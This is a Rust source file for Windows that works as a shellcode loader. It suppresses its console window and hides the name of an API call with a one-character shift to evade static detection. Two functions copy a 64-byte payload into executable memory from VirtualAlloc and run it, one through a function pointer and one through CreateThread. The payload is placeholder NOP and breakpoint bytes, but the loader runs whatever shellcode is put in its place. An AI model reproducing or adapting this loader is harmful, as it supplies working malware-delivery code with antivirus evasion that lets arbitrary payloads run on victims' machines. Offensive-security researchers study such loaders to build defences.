#![windows_subsystem = "windows"]

/*
Note: to statically link vcruntime, add the following to ~/.cargo/config
[target.x86_64-pc-windows-msvc]
rustflags = ["-C", "target-feature=+crt-static"]

*/

use std::{mem::transmute, ptr, ffi::CString};

#[link(name="kernel32")]
extern {
	pub fn LoadLibraryA(lpLibFileName: *const i8) -> *const i8;
	pub fn GetProcAddress(hModule: *const i8, lpProcName: *const i8) -> *const i8;
	pub fn VirtualAlloc(lpAddress: *const u8, dwSize: usize, flAllocationType: i32, flProtect: i32) -> *const u8;

	pub fn CreateThread(lpThreadAttributes: *const i8, dwStackSize: usize, lpStartAddress: *const u8, 
		lpParameter: *const u8, dwCreationFlags: usize, lpThreadId: *const u8) -> *const u8;

	pub fn  WaitForSingleObject(hHandle: *const u8, dwMilliseconds: isize) -> usize;
}

fn main() {
	let user32_str = CString::new("user32").expect("");
	let user32_handle = unsafe{ LoadLibraryA(user32_str.as_ptr()) };
	let message_box_str = CString::new(String::from("NfttbhfCpyB").bytes().map(|x| ((x-1) as char) ).collect::<String>()).expect("");
	let message_box: fn (*const i8, *const i8, *const i8, i32) = 
		unsafe{ transmute( GetProcAddress(user32_handle, message_box_str.as_ptr()) ) } ;
	message_box(ptr::null(), CString::new("This is the body").expect("").as_ptr(), 
		CString::new("This is the title").expect("").as_ptr(), 0);
    
    load_shellcode1();
}

fn load_shellcode1(){
    let payload: [u8; 64] = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc];

    unsafe { 
    	let buffer = VirtualAlloc(ptr::null(), 1000, 0x3000, 0x40) as *mut u8; 
		println!("address: {:?}", buffer);
		ptr::copy_nonoverlapping(payload.as_ptr(), buffer, 64);
		let f: fn () = std::mem::transmute(buffer);
		f();
    }
}

fn load_shellcode2(){
    let payload: [u8; 64] = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 
    					0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc];

    unsafe { 
    	let buffer = VirtualAlloc(ptr::null(), 1000, 0x3000, 0x40) as *mut u8; 
		println!("address: {:?}", buffer);
		ptr::copy_nonoverlapping(payload.as_ptr(), buffer, 64);
		let t = CreateThread(ptr::null(), 0, buffer, ptr::null(), 0, ptr::null());
		WaitForSingleObject(t, -1);
    }
}